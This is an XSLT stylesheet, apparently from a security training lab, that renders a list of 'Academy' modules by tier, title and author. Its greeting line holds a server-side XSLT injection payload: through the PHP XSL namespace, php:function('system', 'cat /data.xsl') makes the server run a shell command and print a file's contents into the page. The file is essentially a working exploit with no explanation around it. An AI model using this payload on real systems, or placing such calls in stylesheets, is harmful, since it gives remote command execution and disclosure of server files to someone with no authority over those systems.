<?xml version="1.0"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
  <xsl:template match="/">
    <html>
      <head>
        <title>Module Overview</title>
      </head>
      <body>
        <h2>Hi <xsl:value-of select="php:function('system','cat /data.xsl')" />, here are your favorite Academy modules:</h2>
        <ol class="rectangle-list">
          <xsl:for-each select="modules/module">
              <li><span>Tier <xsl:value-of select="tier"/>: <b><xsl:value-of select="title"/></b> (by <xsl:value-of select="author"/>)</span></li>
          </xsl:for-each>
        </ol>
      </body>
    </html>
  </xsl:template>
</xsl:stylesheet>